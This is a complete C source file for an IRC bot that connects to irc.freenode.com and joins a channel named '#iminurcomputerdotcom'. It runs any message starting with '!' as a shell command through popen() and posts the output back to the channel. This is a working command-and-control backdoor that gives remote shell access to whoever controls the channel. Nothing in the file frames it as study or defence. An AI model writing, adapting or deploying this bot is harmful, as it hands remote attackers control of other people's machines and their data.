#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <ctype.h>

int conn;
char sbuf[2048];

void raw(char *fmt, ...) {
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(sbuf, 512, fmt, ap);
  va_end(ap);
  printf("<< %s", sbuf);
  write(conn, sbuf, strlen(sbuf));
}

char *trimwhitespace(char *str)
{
  char *end;

  // Trim leading space
  while(isspace((unsigned char)*str)) str++;

  if(*str == 0)  // All spaces?
    return str;

  // Trim trailing space
  end = str + strlen(str) - 1;
  while(end > str && isspace((unsigned char)*end)) end--;

  // Write new null terminator
  *(end+1) = 0;

  return str;
}

int main() {
  char *nick = "poortho-botter";
  char *channel = "#iminurcomputerdotcom";
  char *host = "irc.freenode.com";
  char *port = "6667";

  char *user, *command, *where, *message, *sep, *target;
  int i, j, l, sl, o = -1, start, wordcount;
  char buf[513];
  struct addrinfo hints, *res;

  memset(&hints, 0, sizeof hints);
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  getaddrinfo(host, port, &hints, &res);
  conn = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
  connect(conn, res->ai_addr, res->ai_addrlen);

  raw("USER %s 0 0 :%s\r\n", nick, nick);
  raw("NICK %s\r\n", nick);

  while ((sl = read(conn, sbuf, 512))) {
    for (i = 0; i < sl; i++) {
      o++;
      buf[o] = sbuf[i];
      if ((i > 0 && sbuf[i] == '\n' && sbuf[i - 1] == '\r') || o == 512) {
        buf[o + 1] = '\0';
        l = o;
        o = -1;

        printf(">> %s", buf);

        if (!strncmp(buf, "PING", 4)) {
          buf[1] = 'O';
          raw(buf);
        } else if (buf[0] == ':') {
          wordcount = 0;
          user = command = where = message = NULL;
          for (j = 1; j < l; j++) {
            if (buf[j] == ' ') {
              buf[j] = '\0';
              wordcount++;
              switch(wordcount) {
                case 1: user = buf + 1; break;
                case 2: command = buf + start; break;
                case 3: where = buf + start; break;
              }
              if (j == l - 1) continue;
              start = j + 1;
            } else if (buf[j] == ':' && wordcount == 3) {
              if (j < l - 1) message = buf + j + 1;
              break;
            }
          }

          if (wordcount < 2) continue;

          if (!strncmp(command, "001", 3) && channel != NULL) {
            raw("JOIN %s\r\n", channel);
          } else if (!strncmp(command, "PRIVMSG", 7) || !strncmp(command, "NOTICE", 6)) {
            if (where == NULL || message == NULL) continue;
            if ((sep = strchr(user, '!')) != NULL) user[sep - user] = '\0';
            if (where[0] == '#' || where[0] == '&' || where[0] == '+' || where[0] == '!') target = where; else target = user;
            printf("[from: %s] [reply-with: %s] [where: %s] [reply-to: %s] %s", user, command, where, target, message);
            if (message[0] == '!') {
              FILE *fp;
              char out[1035];

              fp = popen(trimwhitespace(message + 1), "r");
              if (fp == NULL) {
                return 0;
              }

              printf("%s\n", trimwhitespace(message + 1));

              while (fgets(out, sizeof(out) - 1, fp) != NULL) {
                raw("PRIVMSG %s :%s", channel, out);
              }

              pclose(fp);
            }
          }
        }

      }
    }

  }

  return 0;

}
